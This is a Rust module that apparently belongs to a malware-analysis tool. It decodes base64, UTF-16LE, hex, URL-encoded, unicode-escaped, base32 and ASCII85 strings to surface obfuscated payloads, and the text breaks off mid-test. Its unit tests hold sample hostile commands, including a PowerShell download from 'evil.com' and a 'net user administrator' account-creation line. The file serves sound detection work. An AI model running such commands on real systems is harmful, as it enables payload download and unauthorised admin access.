//! String decoders for base64, hex, URL-encoding, and unicode escapes.
//!
//! This module provides decoders for common string encoding schemes found in malware.
//! Each decoder attempts to decode strings and validates the result to minimize false positives.

use crate::{ExtractedString, StringKind, StringMethod};
use data_encoding::{BASE32, BASE32_NOPAD};
use rayon::prelude::*;
use regex::Regex;
use std::sync::LazyLock;

#[allow(clippy::expect_used)]
static QUOTED_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"['"]([^'"]+)['"]"#).expect("static regex"));

/// Matches base64-like substrings within larger strings (e.g. embedded in shell
/// commands). The `{8,}` run only *starts* a candidate — [`accept_embedded`]
/// then decides whether a run this short is trustworthy. A 6-byte payload is 8
/// base64 chars, so this is the floor below which nothing meaningful decodes.
#[allow(clippy::expect_used)]
static EMBEDDED_B64_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"([A-Za-z0-9+/]{8,}={0,2})").expect("static regex"));

/// The alphabet-char count above which an embedded run is trusted on its own —
/// long enough (9 decoded bytes) that a false positive is unlikely. Shorter
/// runs need a corroborating signal; see [`accept_embedded`].
const EMBEDDED_B64_TRUSTED_LEN: usize = 12;

/// Whether an embedded base64 run is worth decoding, given its length, how many
/// `=` pad it, and whether a decode command sits in the same string.
///
/// A short run alone is indistinguishable from an ordinary identifier, so it is
/// only taken with a corroborating signal:
/// - **padding** — a trailing `=` is base64's own tell and almost never follows
///   an identifier, so a padded short run is trustworthy on its own;
/// - **a decode command** — `base64 -d`/`--decode`/`-D` in the string vouches
///   for its argument, catching the unpadded 6–8 byte payloads that have none.
///
/// A run at or above [`EMBEDDED_B64_TRUSTED_LEN`] is taken unconditionally, as
/// the old fixed `{12,}` floor did.
fn accept_embedded(alnum_len: usize, pad: usize, has_command: bool) -> bool {
    alnum_len >= EMBEDDED_B64_TRUSTED_LEN || pad > 0 || has_command
}

/// Whether a string invokes a base64 *decode* command — GNU `base64 -d` /
/// `base64 --decode`, or BSD/macOS `base64 -D`. The argument to such a command
/// is base64 by construction, so a shorter run is trustworthy there than it
/// would be in free text.
fn has_base64_decode_command(s: &str) -> bool {
    ["base64 -d", "base64 --decode", "base64 -D"]
        .iter()
        .any(|m| s.contains(m))
}

/// Minimum length for base64 strings to attempt decoding.
///
/// 12 is the shortest base64 that carries a meaningful short command: a
/// 7–9 byte payload (`/bin/rm`, `uname -a`) encodes to exactly 12 chars, and
/// obfuscated droppers hide exactly those primitives in `base64 -d <<< …`
/// one-liners. It also matches the `{12,}` embedded-base64 extraction regex
/// above, so a run this scan surfaces is a run this decoder will attempt. The
/// input-vs-output quality gate below — not this floor — is what rejects short
/// identifiers that merely look like base64.
pub(crate) const MIN_BASE64_LENGTH: usize = 12;

/// Minimum length for hex-encoded strings to attempt decoding
pub(crate) const MIN_HEX_LENGTH: usize = 16;

/// Maximum size for decoded output (to prevent memory exhaustion)
pub(crate) const MAX_DECODED_SIZE: usize = 10 * 1024 * 1024; // 10MB

/// Validate freshly decoded bytes as printable text, enforcing the size cap.
///
/// Pure-ASCII payloads (tabs/newlines allowed) skip UTF-8 re-validation since ASCII
/// is always valid UTF-8; anything else must parse as UTF-8. Oversized or non-text
/// payloads yield `None` so callers can `?` straight out.
fn decoded_to_text(decoded: Vec<u8>) -> Option<String> {
    if decoded.len() > MAX_DECODED_SIZE {
        return None;
    }
    // Clean ASCII text (tabs/newlines allowed) is valid UTF-8 as-is.
    if decoded
        .iter()
        .all(|&b| b.is_ascii() && (!b.is_ascii_control() || b == b'\n' || b == b'\r' || b == b'\t'))
    {
        return String::from_utf8(decoded).ok();
    }
    // Windows payloads are frequently encoded as little-endian UTF-16 — most
    // notably `powershell -EncodedCommand`, but the same wide-char form shows up
    // in registry blobs, .lnk files, and obfuscated scripts of every filetype.
    // Such bytes are *technically* valid UTF-8 (interleaved NULs are valid
    // single-byte UTF-8), so we must test for the wide-char form before falling
    // back to a plain UTF-8 decode that would yield a NUL-filled string.
    if let Some(s) = decode_utf16le(&decoded) {
        return Some(s);
    }
    std::str::from_utf8(&decoded).ok().map(str::to_string)
}

/// Cheap test for the little-endian UTF-16 wide-text signature: an even length
/// and a clear majority of zero high bytes — the shape of wide-encoded Latin
/// text such as Windows commands, paths, and URLs. Random binary has a ~0.4%
/// chance per code unit of a zero high byte, so this reliably rejects it.
fn looks_like_utf16le(bytes: &[u8]) -> bool {
    bytes.len() >= 4
        && bytes.len().is_multiple_of(2)
        && bytes
            .as_chunks::<2>()
            .0
            .iter()
            .filter(|c| c[1] == 0)
            .count()
            * 2
            >= bytes.len() / 2
}

/// Decode bytes as little-endian UTF-16, but only when they actually look like
/// wide text (see [`looks_like_utf16le`]); arbitrary binary must not be coerced
/// into Unicode.
fn decode_utf16le(bytes: &[u8]) -> Option<String> {
    if !looks_like_utf16le(bytes) {
        return None;
    }
    let code_units: Vec<u16> = bytes
        .as_chunks::<2>()
        .0
        .iter()
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    let decoded = String::from_utf16(&code_units).ok()?;
    // Drop a leading byte-order mark and reject control-heavy results that
    // slipped past the heuristic.
    let s = decoded.trim_start_matches('\u{feff}');
    if s.chars()
        .any(|c| c.is_control() && !matches!(c, '\n' | '\r' | '\t'))
    {
        return None;
    }
    Some(s.to_string())
}

/// Deobfuscate strings that use concatenation patterns.
///
/// Many malware samples split encoded strings using concatenation to evade detection:
/// - JavaScript: `"ZnVu" + "Y3Rp" + "b24"`
/// - Python: `'ZnVu' + 'Y3Rp' + 'b24'`
/// - PHP: `'ZnVu' . 'Y3Rp' . 'b24'`
/// - Obfuscated: `"ZnVu" + 'A' + "Y3Rp"` (junk inserted between chunks)
///
/// This function detects these patterns, extracts the quoted segments,
/// and reassembles them into the original encoded string.
pub(crate) fn deobfuscate_concatenation(s: &str) -> Option<String> {
    // Check if the string contains common concatenation patterns
    if !s.contains(" + ") && !s.contains(" . ") && !s.contains(" .. ") {
        return None;
    }

    let mut segments = Vec::new();

    for cap in QUOTED_RE.captures_iter(s) {
        if let Some(content) = cap.get(1) {
            segments.push(content.as_str());
        }
    }

    // Need at least 2 segments to be concatenation
    if segments.len() < 2 {
        return None;
    }

    // Reassemble all segments
    let reassembled = segments.join("");

    // Only return if the result is different and potentially useful
    // (longer strings, higher chance of being encoded data)
    if reassembled.len() >= MIN_BASE64_LENGTH && reassembled != s {
        Some(reassembled)
    } else {
        None
    }
}

/// Extract and decode base64 embedded within larger strings.
///
/// This handles cases where base64 is embedded in code or commands:
/// - Python: `exec(base64.b64decode('YWJjZGVm'))`
/// - Shell: `echo YWJjZGVm | base64 -d`
/// - JavaScript: `atob('YWJjZGVm')`
///
/// Unlike `decode_base64_strings` which decodes entire strings that are base64,
/// this function extracts base64 substrings from within larger strings.
pub(crate) fn extract_embedded_base64(strings: &[ExtractedString]) -> Vec<ExtractedString> {
    // Each input string can yield several embedded payloads; `flat_map_iter`
    // parallelises across strings while keeping each string's per-capture order.
    strings
        .par_iter()
        .flat_map_iter(|s| {
            let mut local = Vec::new();
            let has_command = has_base64_decode_command(&s.value);
            for cap in EMBEDDED_B64_RE.captures_iter(&s.value) {
                if let Some(b64_match) = cap.get(1) {
                    let b64_str = b64_match.as_str();

                    // Skip if it's the entire string (handled by decode_base64_strings)
                    if b64_str == s.value {
                        continue;
                    }

                    // Must be valid base64 length (multiple of 4)
                    if b64_str.len() % 4 != 0 {
                        continue;
                    }

                    // A short run is trusted only when padding or a decode
                    // command corroborates it; a long run stands on its own.
                    let pad = b64_str.bytes().rev().take_while(|&b| b == b'=').count();
                    if !accept_embedded(b64_str.len() - pad, pad, has_command) {
                        continue;
                    }

                    // Try to decode it
                    if let Ok(decoded) =
                        base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64_str)
                    {
                        // Check size limit
                        if decoded.len() > MAX_DECODED_SIZE {
                            continue;
                        }

                        // Validate it's printable text (UTF-8 or wide UTF-16LE).
                        if let Some(decoded_str) = decoded_to_text(decoded) {
                            let trimmed = decoded_str.trim();

                            // Must be meaningful (at least 4 chars after trim)
                            if trimmed.len() >= 4 {
                                local.push(ExtractedString {
                                    value: trimmed.to_string(),
                                    // The base64 token sits at `b64_match.start()`
                                    // within the parent's bytes; its source extent
                                    // is the encoded token, not the decoded value.
                                    data_offset: s.data_offset + b64_match.start() as u64,
                                    data_len: u32::try_from(b64_str.len()).unwrap_or(u32::MAX),
                                    method: StringMethod::Base64Decode,
                                    kind: crate::classify_string(trimmed),
                                    ..Default::default()
                                });
                            }
                        }
                    }
                }
            }
            local
        })
        .collect()
}

/// Decode base64-encoded strings from a list of extracted strings.
///
/// Returns a vector of newly decoded strings with `StringMethod::Base64Decode`.
/// Also attempts to deobfuscate concatenated strings first.
pub(crate) fn decode_base64_strings(strings: &[ExtractedString]) -> Vec<ExtractedString> {
    strings
        .par_iter()
        .filter_map(|s| {
            // Try normal base64 decoding first
            if (s.kind == Some(StringKind::Base64) || is_likely_base64(&s.value))
                && let Some(decoded) = decode_base64_string(s)
            {
                return Some(decoded);
            }

            // If that didn't work, try deobfuscating concatenation first
            if let Some(deobfuscated) = deobfuscate_concatenation(&s.value)
                && is_likely_base64(&deobfuscated)
            {
                // Create a temporary ExtractedString with deobfuscated content
                let temp = ExtractedString {
                    value: deobfuscated,
                    data_offset: s.data_offset,
                    // The decoded payload occupies the parent's source bytes,
                    // not the (shorter) deobfuscated form.
                    data_len: s.contiguous_source_len(),
                    method: s.method,
                    kind: s.kind,
                    ..Default::default()
                };

                return decode_base64_string(&temp);
            }

            None
        })
        .collect()
}

/// Attempt to decode a single base64 string.
fn decode_base64_string(s: &ExtractedString) -> Option<ExtractedString> {
    if s.value.len() < MIN_BASE64_LENGTH {
        return None;
    }

    // Try standard base64 decoding
    let decoded =
        base64::Engine::decode(&base64::engine::general_purpose::STANDARD, s.value.trim()).ok()?;

    // Wide (UTF-16LE) payloads are validated strictly during decoding, and their
    // base64 is artificially 'A'-heavy (from interleaved NULs), which would fool
    // the quality heuristic below — so note it before the bytes are consumed.
    let is_wide = looks_like_utf16le(&decoded);

    let decoded_str = decoded_to_text(decoded)?;

    // Reject if decoded string is too short or just whitespace
    let trimmed = decoded_str.trim();
    if trimmed.len() < 4 {
        return None;
    }

    // Reject if input is more text-like than output (false positive detection)
    // e.g., "IWorkItemQueriesExt2" decoding to binary garbage. Skipped for wide
    // text, which the UTF-16LE decoder has already validated as clean. Score the
    // trimmed decode: a trailing newline (routine in `base64 -d <<< …` and
    // `echo … | base64` payloads) is not a quality defect, and penalizing it
    // would sink genuine short commands like `/bin/rm\n` below their base64.
    if !is_wide {
        let input_quality = string_quality_score(&s.value);
        let output_quality = string_quality_score(trimmed);
        if input_quality > output_quality {
            return None;
        }
    }

    // Classify before moving
    let kind = crate::classify_string(&decoded_str);

    // Create new ExtractedString with decoded content. The decoded text lives
    // in the encoded source's bytes — inherit the parent base64 string's extent,
    // not the decoded length.
    Some(ExtractedString {
        value: decoded_str,
        data_offset: s.data_offset,
        data_len: s.contiguous_source_len(),
        method: StringMethod::Base64Decode,
        kind,
        ..Default::default()
    })
}

/// Decode hex-encoded strings from a list of extracted strings.
///
/// Returns a vector of newly decoded strings with `StringMethod::HexDecode`.
pub(crate) fn decode_hex_strings(strings: &[ExtractedString]) -> Vec<ExtractedString> {
    strings
        .par_iter()
        .filter(|s| s.kind == Some(StringKind::HexEncoded) || is_likely_hex(&s.value))
        .filter_map(decode_hex_string)
        .collect()
}

/// Attempt to decode a single hex-encoded string.
fn decode_hex_string(s: &ExtractedString) -> Option<ExtractedString> {
    if s.value.len() < MIN_HEX_LENGTH || !s.value.len().is_multiple_of(2) {
        return None;
    }

    // Decode hex
    let decoded = hex::decode(s.value.trim()).ok()?;

    let decoded_str = decoded_to_text(decoded)?;

    // Reject if too short
    let trimmed = decoded_str.trim();
    if trimmed.len() < 4 {
        return None;
    }

    // Classify before moving
    let kind = crate::classify_string(&decoded_str);

    Some(ExtractedString {
        value: decoded_str,
        data_offset: s.data_offset,
        method: StringMethod::HexDecode,
        kind,
        ..Default::default()
    })
}

/// Decode URL-encoded strings from a list of extracted strings.
///
/// Returns a vector of newly decoded strings with `StringMethod::UrlDecode`.
pub(crate) fn decode_url_strings(strings: &[ExtractedString]) -> Vec<ExtractedString> {
    strings
        .par_iter()
        .filter(|s| s.kind == Some(StringKind::UrlEncoded) || is_likely_url_encoded(&s.value))
        .filter_map(decode_url_string)
        .collect()
}

/// True if any `%XX` escape decodes to an unreserved character (ASCII
/// alphanumeric). Legitimate URL encoding only escapes reserved/unsafe
/// characters; percent-encoding an alphanumeric (`%75` = `u`) is the signature
/// of deliberate obfuscation, not normal URL syntax.
fn encodes_unreserved_char(s: &str) -> bool {
    let bytes = s.as_bytes();
    let mut i = 0;
    while i + 2 < bytes.len() {
        if bytes[i] == b'%'
            && let (Some(hi), Some(lo)) = (
                (bytes[i + 1] as char).to_digit(16),
                (bytes[i + 2] as char).to_digit(16),
            )
        {
            #[allow(clippy::cast_possible_truncation)]
            let decoded = (hi * 16 + lo) as u8;
            if decoded.is_ascii_alphanumeric() {
                return true;
            }
            i += 3;
            continue;
        }
        i += 1;
    }
    false
}

/// Attempt to decode a single URL-encoded string.
fn decode_url_string(s: &ExtractedString) -> Option<ExtractedString> {
    // Must contain at least one % escape sequence
    if !s.value.contains('%') {
        return None;
    }

    // A URL's percent-encoding is legitimate syntax, not an encoded payload:
    // `…?title=Special%3ASearch` or `#:~:text=Function%3A%20foo` decode to the
    // same readable URL, hiding nothing. Skip when the string carries a URL
    // scheme and only escapes reserved characters; decode it only when an
    // *unreserved* char is percent-encoded (`%75` = `u`), the signature of
    // deliberate obfuscation that legitimate URL encoders never produce.
    if s.value.contains("://") && !encodes_unreserved_char(&s.value) {
        return None;
    }

    // URL decode (into_owned reuses the String when decode allocated one,
    // instead of copying the Cow's contents again).
    let decoded = urlencoding::decode(&s.value).ok()?.into_owned();

    // Must be different from original (actually encoded)
    if decoded == s.value {
        return None;
    }

    // Reject if too short
    if decoded.trim().len() < 4 {
        return None;
    }

    // Classify before moving
    let kind = crate::classify_string(&decoded);

    Some(ExtractedString {
        value: decoded,
        data_offset: s.data_offset,
        method: StringMethod::UrlDecode,
        kind,
        ..Default::default()
    })
}

/// Decode unicode escape sequences from a list of extracted strings.
///
/// Returns a vector of newly decoded strings with `StringMethod::UnicodeEscapeDecode`.
pub(crate) fn decode_unicode_escape_strings(strings: &[ExtractedString]) -> Vec<ExtractedString> {
    strings
        .par_iter()
        .filter(|s| {
            s.kind == Some(StringKind::UnicodeEscaped)
                || s.value.contains("\\x")
                || s.value.contains("\\u")
                || s.value.contains("\\U")
        })
        .filter_map(decode_unicode_escape_string)
        .collect()
}

/// Attempt to decode a single unicode-escaped string.
fn decode_unicode_escape_string(s: &ExtractedString) -> Option<ExtractedString> {
    // Must contain escape sequences
    if !s.value.contains("\\x") && !s.value.contains("\\u") && !s.value.contains("\\U") {
        return None;
    }

    let decoded = decode_unicode_escapes(&s.value)?;

    // Must be different from original
    if decoded == s.value {
        return None;
    }

    // Reject if too short
    if decoded.trim().len() < 4 {
        return None;
    }

    // Classify before moving
    let kind = crate::classify_string(&decoded);

    Some(ExtractedString {
        value: decoded,
        data_offset: s.data_offset,
        method: StringMethod::UnicodeEscapeDecode,
        kind,
        ..Default::default()
    })
}

/// Decode unicode escape sequences in a string.
///
/// Handles: \xHH, \uHHHH, \UHHHHHHHH
fn decode_unicode_escapes(s: &str) -> Option<String> {
    let mut result = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    let mut changed = false;

    while let Some(ch) = chars.next() {
        if ch == '\\' {
            match chars.peek() {
                Some('x') => {
                    // \xHH - 2 hex digits
                    chars.next(); // consume 'x'
                    if let Some(decoded_char) = parse_hex_escape(&mut chars, 2) {
                        result.push(decoded_char);
                        changed = true;
                        continue;
                    }
                    result.push('\\');
                    result.push('x');
                }
                Some('u') => {
                    // \uHHHH - 4 hex digits
                    chars.next(); // consume 'u'
                    if let Some(decoded_char) = parse_hex_escape(&mut chars, 4) {
                        result.push(decoded_char);
                        changed = true;
                        continue;
                    }
                    result.push('\\');
                    result.push('u');
                }
                Some('U') => {
                    // \UHHHHHHHH - 8 hex digits
                    chars.next(); // consume 'U'
                    if let Some(decoded_char) = parse_hex_escape(&mut chars, 8) {
                        result.push(decoded_char);
                        changed = true;
                        continue;
                    }
                    result.push('\\');
                    result.push('U');
                }
                _ => result.push(ch),
            }
        } else {
            result.push(ch);
        }
    }

    if changed { Some(result) } else { None }
}

/// Parse a hex escape sequence of the specified length.
fn parse_hex_escape(
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
    len: usize,
) -> Option<char> {
    let hex_str: String = chars.take(len).collect();
    if hex_str.len() != len {
        return None;
    }

    let code_point = u32::from_str_radix(&hex_str, 16).ok()?;
    char::from_u32(code_point)
}

/// Check if a string looks like base64-encoded data.
fn is_likely_base64(s: &str) -> bool {
    if s.len() < MIN_BASE64_LENGTH {
        return false;
    }

    // Must be multiple of 4 (proper base64 padding)
    if !s.len().is_multiple_of(4) {
        return false;
    }

    // Single pass: count base64-alphabet chars, the leading run of lowercase
    // (to reject lowerCamelCase identifiers), and which case/digit classes
    // appear. (Previously three separate passes over the string.)
    let mut base64_chars = 0usize;
    let mut consecutive_lower_at_start = 0;
    let mut leading_run_done = false;
    let mut has_upper = false;
    let mut has_lower = false;
    let mut has_digit = false;
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=' {
            base64_chars += 1;
        }
        if c.is_ascii_lowercase() {
            has_lower = true;
            if !leading_run_done {
                consecutive_lower_at_start += 1;
            }
        } else {
            leading_run_done = true;
            if c.is_ascii_uppercase() {
                has_upper = true;
            } else if c.is_ascii_digit() {
                has_digit = true;
            }
        }
    }

    // If >= 80% base64 characters, likely encoded
    if (base64_chars as f32 / s.len() as f32) < 0.8 {
        return false;
    }

    // Reject lowerCamelCase identifiers (4+ consecutive lowercase at start)
    // Like "wants10KeepAlive", "maxReceiveBuffer"
    if consecutive_lower_at_start >= 4 {
        return false;
    }

    // Real base64 has mixed case and digits, not just CamelCase
    has_upper && has_lower && has_digit
}

/// Check if a string looks like hex-encoded data.
fn is_likely_hex(s: &str) -> bool {
    if s.len() < MIN_HEX_LENGTH || !s.len().is_multiple_of(2) {
        return false;
    }

    s.chars().all(|c| c.is_ascii_hexdigit())
}

/// Check if a string looks like URL-encoded data.
fn is_likely_url_encoded(s: &str) -> bool {
    if !s.contains('%') {
        return false;
    }

    // Count valid %XX sequences
    let mut percent_count = 0;
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%'
            && i + 2 < bytes.len()
            && bytes[i + 1].is_ascii_hexdigit()
            && bytes[i + 2].is_ascii_hexdigit()
        {
            percent_count += 1;
            i += 3;
            continue;
        }
        i += 1;
    }

    // At least 3 valid %XX sequences
    percent_count >= 3
}

/// Decode base32-encoded strings from a list of extracted strings.
///
/// Returns a vector of newly decoded strings with `StringMethod::Base32Decode`.
pub(crate) fn decode_base32_strings(strings: &[ExtractedString]) -> Vec<ExtractedString> {
    strings
        .par_iter()
        .filter(|s| s.kind == Some(StringKind::Base32) || is_likely_base32(&s.value))
        .filter_map(decode_base32_string)
        .collect()
}

/// Attempt to decode a single base32 string.
fn decode_base32_string(s: &ExtractedString) -> Option<ExtractedString> {
    if s.value.len() < 16 {
        return None;
    }

    // Try decoding with padding
    let decoded = BASE32
        .decode(s.value.trim().as_bytes())
        .or_else(|_| BASE32_NOPAD.decode(s.value.trim().as_bytes()))
        .ok()?;

    let decoded_str = decoded_to_text(decoded)?;

    // Reject if decoded string is too short or just whitespace
    let trimmed = decoded_str.trim();
    if trimmed.len() < 4 {
        return None;
    }

    // Classify before moving
    let kind = crate::classify_string(&decoded_str);

    // Create new ExtractedString with decoded content
    Some(ExtractedString {
        value: decoded_str,
        data_offset: s.data_offset,
        method: StringMethod::Base32Decode,
        kind,
        ..Default::default()
    })
}

/// Decode base85-encoded strings from a list of extracted strings.
///
/// Returns a vector of newly decoded strings with `StringMethod::Base85Decode`.
pub(crate) fn decode_base85_strings(strings: &[ExtractedString]) -> Vec<ExtractedString> {
    strings
        .par_iter()
        .filter(|s| s.kind == Some(StringKind::Base85) || is_likely_base85(&s.value))
        .filter_map(decode_base85_string)
        .collect()
}

/// Attempt to decode a single base85 string (ASCII85 format).
fn decode_base85_string(s: &ExtractedString) -> Option<ExtractedString> {
    if s.value.len() < 20 {
        return None;
    }

    // Try ASCII85 decoding
    let input = s.value.trim();
    let decoded = decode_ascii85(input)?;

    let decoded_str = decoded_to_text(decoded)?;

    // Reject if decoded string is too short or just whitespace
    let trimmed = decoded_str.trim();
    if trimmed.len() < 4 {
        return None;
    }

    // Classify before moving
    let kind = crate::classify_string(&decoded_str);

    Some(ExtractedString {
        value: decoded_str,
        data_offset: s.data_offset,
        method: StringMethod::Base85Decode,
        kind,
        ..Default::default()
    })
}

/// Try to decode ASCII85 encoded data. Public for validation purposes.
/// Returns None if decoding fails.
pub(crate) fn try_decode_ascii85(s: &str) -> Option<Vec<u8>> {
    decode_ascii85(s)
}

/// Decode ASCII85 encoded data.
/// ASCII85 uses characters from '!' (33) to 'u' (117), plus 'z' for four zero bytes.
fn decode_ascii85(s: &str) -> Option<Vec<u8>> {
    let mut result = Vec::new();
    let mut group = Vec::new();

    for ch in s.chars() {
        match ch {
            // Skip ASCII85 delimiters and whitespace first
            '<' | '~' | '>' => {
                // Skip ASCII85 delimiters (<~ and ~>)
                continue;
            }
            ' ' | '\t' | '\n' | '\r' => {
                // Skip whitespace
                continue;
            }
            'z' => {
                // 'z' represents four zero bytes (shorthand)
                if !group.is_empty() {
                    return None; // 'z' must not appear in the middle of a group
                }
                result.extend_from_slice(&[0u8; 4]);
            }
            '!'..='u' => {
                group.push((ch as u8) - b'!');
                if group.len() == 5 {
                    // Decode 5 base85 digits to 4 bytes
                    let mut value: u32 = 0;
                    for &digit in &group {
                        value = value
                            .checked_mul(85)
                            .and_then(|v| v.checked_add(u32::from(digit)))?;
                    }
                    result.extend_from_slice(&value.to_be_bytes());
                    group.clear();
                }
            }
            _ => {
                // Invalid character
                return None;
            }
        }
    }

    // Handle remaining partial group
    if !group.is_empty() {
        let original_len = group.len();
        // Pad with 'u' (84) to make 5 digits
        while group.len() < 5 {
            group.push(84);
        }

        let mut value: u32 = 0;
        for &digit in &group {
            value = value
                .checked_mul(85)
                .and_then(|v| v.checked_add(u32::from(digit)))?;
        }

        let bytes = value.to_be_bytes();
        let output_len = original_len - 1; // Output n-1 bytes for n input characters
        result.extend_from_slice(&bytes[..output_len]);
    }

    Some(result)
}

/// Check if a string looks like base32-encoded data.
fn is_likely_base32(s: &str) -> bool {
    if s.len() < 16 {
        return false;
    }

    // Single pass validation using bytes
    let bytes = s.as_bytes();
    let mut valid_count = 0;
    let mut has_letters = false;
    let mut has_digits = false;

    for &b in bytes {
        match b {
            b'A'..=b'Z' => {
                has_letters = true;
                valid_count += 1;
            }
            b'2'..=b'7' => {
                has_digits = true;
                valid_count += 1;
            }
            b'=' => valid_count += 1,
            _ => {}
        }
    }

    // Must have both letters and digits
    has_letters && has_digits && (valid_count * 10 >= s.len() * 9)
}

/// Check if a string looks like base85-encoded data.
/// Calculate string quality score (0-100). Higher scores = better quality text.
fn string_quality_score(s: &str) -> u32 {
    if s.is_empty() {
        return 0;
    }

    let mut alpha_count = 0usize;
    let mut vowel_count = 0usize;
    let mut printable_count = 0usize;

    for c in s.chars() {
        if c.is_ascii_alphabetic() {
            alpha_count += 1;
            if matches!(c.to_ascii_lowercase(), 'a' | 'e' | 'i' | 'o' | 'u') {
                vowel_count += 1;
            }
        }
        if c.is_ascii_graphic() || c == ' ' {
            printable_count += 1;
        }
    }

    let len = s.len();
    let printable_ratio = (printable_count * 100) / len;
    let vowel_ratio = (vowel_count * 100).checked_div(alpha_count).unwrap_or(0);

    // Quality = weighted combination of printability and vowel ratio
    u32::try_from((printable_ratio * 7 + vowel_ratio * 3) / 10).unwrap_or(0)
}

fn is_likely_base85(s: &str) -> bool {
    // Require minimum length
    if s.len() < 20 {
        return false;
    }

    // Check for ASCII85 delimiters (<~ and ~>)
    let has_delimiters = s.starts_with("<~") && s.ends_with("~>");

    // If it has delimiters, validate by attempting to decode
    if has_delimiters {
        let original_quality = string_quality_score(s);
        if let Some(decoded) = decode_ascii85(s)
            && let Ok(decoded_str) = String::from_utf8(decoded)
        {
            let decoded_quality = string_quality_score(&decoded_str);
            // Decoded should be better quality (at least 5 points higher)
            return decoded_quality > original_quality + 5;
        }
        // If decode fails or quality is worse, reject
        return false;
    }

    // Count valid ASCII85 characters
    let bytes = s.as_bytes();
    let mut valid_count = 0;
    let mut has_special_chars = false;

    for &b in bytes {
        if matches!(b, b'!'..=b'u' | b'z') {
            valid_count += 1;
            // Look for special chars that are unlikely in normal text
            if matches!(
                b,
                b'!' | b'"' | b'#' | b'$' | b'%' | b'&' | b'\'' | b'(' | b')' | b'*' | b'+' | b','
            ) {
                has_special_chars = true;
            }
        }
    }

    // For shorter strings (< 50), use moderate threshold + special char check
    if s.len() < 50 {
        if !has_special_chars || valid_count * 10 < s.len() * 9 {
            return false;
        }
    } else {
        // For longer strings, be stricter
        if valid_count * 100 < s.len() * 95 {
            return false;
        }
    }

    // Final validation: try decoding and check quality
    let original_quality = string_quality_score(s);
    if let Some(decoded) = decode_ascii85(s)
        && let Ok(decoded_str) = String::from_utf8(decoded)
    {
        let decoded_quality = string_quality_score(&decoded_str);
        // Decoded should be better quality (at least 5 points higher)
        return decoded_quality > original_quality + 5;
    }

    // If can't decode or quality is worse, it's not real base85
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base64_decode() {
        let input = ExtractedString {
            value: "SGVsbG8gV29ybGQh".to_string(), // "Hello World!"
            data_offset: 0,
            method: StringMethod::RawScan,
            kind: Some(StringKind::Base64),
            ..Default::default()
        };

        let result = decode_base64_string(&input).unwrap();
        assert_eq!(result.value, "Hello World!");
        assert_eq!(result.method, StringMethod::Base64Decode);
    }

    #[test]
    fn test_base64_decode_short_commands() {
        // The dropper primitives hidden in `base64 -d <<< …` one-liners are
        // short: `/bin/rm` and `uname -a` each encode to just 12 base64 chars.
        // They must decode — the 12-char floor exists precisely for these.
        for (encoded, plain) in [
            ("L2Jpbi9ybQ==", "/bin/rm"),   // 7 bytes  -> 12 chars
            ("L2Jpbi9ybQo=", "/bin/rm\n"), // gentoo's exact literal
            ("dW5hbWUgLWE=", "uname -a"),  // 8 bytes  -> 12 chars
        ] {
            let s = make_string(encoded, Some(StringKind::Base64));
            let out = decode_base64_string(&s)
                .unwrap_or_else(|| panic!("{encoded} should decode to {plain:?}"));
            assert_eq!(out.value, plain);
            assert_eq!(out.method, StringMethod::Base64Decode);
        }
    }

    /// Encode an ASCII string as little-endian UTF-16 (the Windows wide-char form).
    fn utf16le(s: &str) -> Vec<u8> {
        s.encode_utf16().flat_map(u16::to_le_bytes).collect()
    }

    #[test]
    fn test_decode_utf16le_ascii() {
        assert_eq!(
            decode_utf16le(&utf16le("whoami /all")).as_deref(),
            Some("whoami /all")
        );
    }

    #[test]
    fn test_decode_utf16le_strips_bom() {
        let mut bytes = vec![0xFF, 0xFE]; // UTF-16LE BOM
        bytes.extend(utf16le("Get-Process"));
        assert_eq!(decode_utf16le(&bytes).as_deref(), Some("Get-Process"));
    }

    #[test]
    fn test_decode_utf16le_rejects_binary() {
        // Arbitrary binary should not be coerced into wide text.
        let binary = [0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00];
        assert_eq!(decode_utf16le(&binary), None);
    }

    #[test]
    fn test_decode_utf16le_rejects_odd_length() {
        assert_eq!(decode_utf16le(&[0x48, 0x00, 0x65]), None);
    }

    #[test]
    fn test_base64_decode_utf16le() {
        // The canonical Windows form: base64 over little-endian UTF-16, like the
        // payload of `powershell -EncodedCommand`, embedded in any filetype.
        let wide = utf16le("Invoke-WebRequest http://evil.com/x.exe");
        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &wide);
        let result = decode_base64_string(&make_string(&b64, Some(StringKind::Base64)))
            .expect("base64-over-utf16le should decode");
        assert_eq!(result.value, "Invoke-WebRequest http://evil.com/x.exe");
        assert_eq!(result.method, StringMethod::Base64Decode);
    }

    #[test]
    fn test_decode_base64_strings_utf16le_batch() {
        let wide = utf16le("net user administrator P@ssw0rd /add");
        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &wide);
        let results = decode_base64_strings(&[make_string(&b64, Some(StringKind::Base64))]);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].value, "net user administrator P@ssw0rd /add");
    }

    #[test]
    fn test_hex_decode() {
        let input = ExtractedString {
            value: "48656c6c6f20576f726c6421".to_string(), // "Hello World!"
            data_offset: 0,
            method: StringMethod::RawScan,
            kind: Some(StringKind::HexEncoded),
            ..Default::default()
        };

        let result = decode_hex_string(&input).unwrap();
        assert_eq!(result.value, "Hello World!");
        assert_eq!(result.method, StringMethod::HexDecode);
    }

    #[test]
    fn test_url_decode() {
        let input = ExtractedString {
            value: "Hello%20World%21%20%2B%20More".to_string(), // "Hello World! + More"
            data_offset: 0,
            method: StringMethod::RawScan,
            kind: Some(StringKind::UrlEncoded),
            ..Default::default()
        };

        let result = decode_url_string(&input).unwrap();
        assert_eq!(result.value, "Hello World! + More");
        assert_eq!(result.method, StringMethod::UrlDecode);
    }

    #[test]
    fn test_url_with_normal_encoding_not_decoded_as_payload() {
        // A real URL whose percent-encoding only covers reserved chars (`:`,
        // space) is normal URL syntax, not an encoded payload — even when the
        // extracted string carries source context (`x = "..."`) and is therefore
